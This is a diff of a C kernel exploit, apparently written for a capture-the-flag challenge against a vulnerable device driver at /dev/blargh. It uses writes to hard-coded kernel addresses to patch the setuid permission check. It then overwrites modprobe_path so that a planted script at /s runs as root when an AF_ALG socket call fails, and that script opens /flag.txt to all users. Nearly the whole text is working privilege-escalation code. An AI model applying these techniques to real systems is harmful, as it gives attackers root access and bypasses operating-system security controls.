@@ -1,4 +1,3 @@
-#define _GNU_SOURCE
 #include <string.h>
 #include <stdio.h>
 #include <fcntl.h>
@@ -6,11 +5,14 @@
 #include <unistd.h>
 #include <assert.h>
 #include <stdlib.h>
-#include <signal.h>
 #include <err.h>
 #include <errno.h>
 #include <sys/mman.h>
 #include <sys/ioctl.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <stdarg.h>
 
 // commands
 #define DEV_PATH "/dev/blargh"   // the path the device is placed
@@ -52,14 +54,9 @@ static void print_hex8(char* buf, size_t len)
     printf("\n");
 }
 
-static void shell_modprobe() {
-    //system("echo '#!/bin/sh' > /home/user/x; echo 'setsid cttyhack setuidgid 0 \
-           /bin/sh' >> /home/user/x");
+static void shell_modprobe_setup() {
     system("echo '#!/bin/sh\nchmod 777 /flag.txt' > /s");
-    system("chmod +x /s");
-    //system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
-    //system("chmod +x /tmp/y");
-    //system("/tmp/y");
+    system("chmod 777 /s");
 }
 
 struct pt_regs {
@@ -136,6 +133,45 @@ void do_write(int fd, size_t off) {
 // umode_t = short
 
 // 0x7ecfcda0
+static uint64_t write_off = 0x7ecfcda0;
+
+void overwrite_setuid(int fd) {
+    // change the jump after ns_capable_setid in sys_setuid to always succeed
+    // (jumps to the next instr)
+    uint64_t sys_setuid = 0xffffffff812a86a9+write_off+1;
+    do_write(fd, sys_setuid);
+    int ret = setuid(0);
+    if (ret < 0) {
+        errExit("Didn't work\n");
+    }
+    system("cat /flag.txt");
+}
+
+typedef struct {
+    uint16_t salg_family;
+    uint8_t salg_type[14];
+    uint32_t salg_feat;
+    uint32_t salg_mask;
+    uint8_t salg_name[64];
+} sockaddr_alg_t;
+
+void new_modprobe(int fd) {
+    shell_modprobe_setup();
+
+    sockaddr_alg_t sa;
+
+    // change modprobe path to /s
+    uint64_t modprobe = 0xffffffff82b45b20;
+    do_write(fd, modprobe+ write_off +2);
+
+    // request_module will also be called if socket call fails
+    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+    if (alg_fd < 0) {
+        puts("socket(AF_ALG) failed");
+    }
+
+    system("cat /flag.txt");
+}
 
 int main(void) {
     int ret;
@@ -146,30 +182,22 @@ int main(void) {
     }
 
     // is subtracted from the address we pass
-    uint64_t write_off = 0x7ecfcda0;
 
     // get infinite zero byte writes by changing write to
     // mov    eax,DWORD PTR [rip+0x6] so it always writes bytes != 0 to eax,
     // causing the jump to not be taken
-    uint64_t module_base = 0xffffffffc0000000;
-    do_write(fd, module_base+ write_off +0x1c+3);
-
-    // change the jump after ns_capable_setid in sys_setuid to always succeed
-    // (jumps to the next instr)
-    uint64_t sys_setuid = 0xffffffff812a86a9+write_off+1;
-    do_write(fd, sys_setuid);
+    //uint64_t module_base = 0xffffffffc0000000;
+    //do_write(fd, module_base+ write_off +0x1c+3);
 
     //uint64_t cap_capable = 0xffffffff816a4457 +1+ write_off;
     //do_write(fd, cap_capable);
 
-    ret = setuid(0);
-    if (ret < 0) {
-        errExit("Didn't work\n");
-    }
+    //overwrite_setuid(fd);
+
+    new_modprobe(fd);
 
     puts("Done");
 
-    system("cat /flag.txt");
 
     WAIT();
 }
